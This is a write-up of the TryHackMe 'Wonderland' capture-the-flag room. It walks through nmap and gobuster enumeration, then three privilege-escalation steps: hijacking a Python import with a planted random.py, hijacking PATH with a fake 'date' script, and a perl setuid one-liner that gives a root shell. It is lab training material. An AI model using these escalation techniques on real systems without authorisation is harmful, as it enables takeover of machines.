---
title: Wonderland
published: 2023-09-20
description: 'A writeup of the tryhackme room wonderland'
image: ''
tags: [Tryhackme]
category: 'Writeups'
project: 'Tryhackme Writeups'
draft: false 
---
# Wonderland Room Writeup

## Enumeration

```BASH
sudo nmap -oA nmap/wonderland -sV -sC -sS -vv -T4 10.10.130.143
```
```BASH
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```

```BASH
gobuster dir -e -u http://10.10.130.143/ -w /usr/share/wordlists/dirb/common.txt -t40
```
We find `/r` with a message telling us to keep going, let's try adding `/r` to our url.

```BASH
gobuster dir -e -u http://10.10.130.143/r/ -w /usr/share/wordlists/dirb/common.txt -t40
```

```BASH
gobuster dir -e -u http://10.10.130.143/r/a/ -w /usr/share/wordlists/dirb/common.txt -t40
```

We get another message to keep going... repeating the same we get `/r/a/b/`. Seeing the pattern, navigate to `/r/a/b/b/i/t`. Right click to inspect the page, and you should find some credentials in a hidden `<p>` tag.

SSH into the machine with these credentials. Try and `cat` the user flag and you will be denied. Thinking of the hint "everything is upside down", navigate to `/root` for the user flag.

Running `sudo -l`, we are able to execute `walrus_and_the_carpenter.py` as rabbit. Since we are unable to edit this file, it does not seem very useful. However, we do see the file imports the random python library. We can create a local file in the same directory `random.py`, this will override the import statement to import our file and not the random library. We can use this to gain a shell as rabbit:

```python
import os 

os.system("/bin/bash")
```

In rabbit's home directory we see a SUID binary. When run, it asks us to be polite and ask for some tea. However this gets us nowhere. We notice the program is outputing today's date at the top. `cat` the binary and notice `date` as a variable.

We can create `date` as a file, and add its directory to $PATH to override the `date` variable.

date
```BASH
#!/bin/bash
/bin/bash
```

```BASH
rabbit@wonderland:/home/rabbit$ chmod +x date 
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
rabbit@wonderland:/home/rabbit$ ./teaParty 
```

Now we have another shell, but this time we are the `hatter` user. Navigating to their home directory we find their password, ssh back into the machine for a better shell.

Capabilities are privellges for processes or binaries. Let's look for them on our machine

```BASH
getcap -r / ls 2>/dev/null
```

We see the `CAP_SETUID` is set on the perl binary.

```BASH
-rwxr-xr-- 2 root   hatter   2097720 Nov 19  2018 perl
```

Taking a look on [gtfoBins](https://gtfobins.github.io/gtfobins/perl/) we can execute the following command for a root shell. From there, recall the root.txt file is in alice's home directory.

```BASH
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```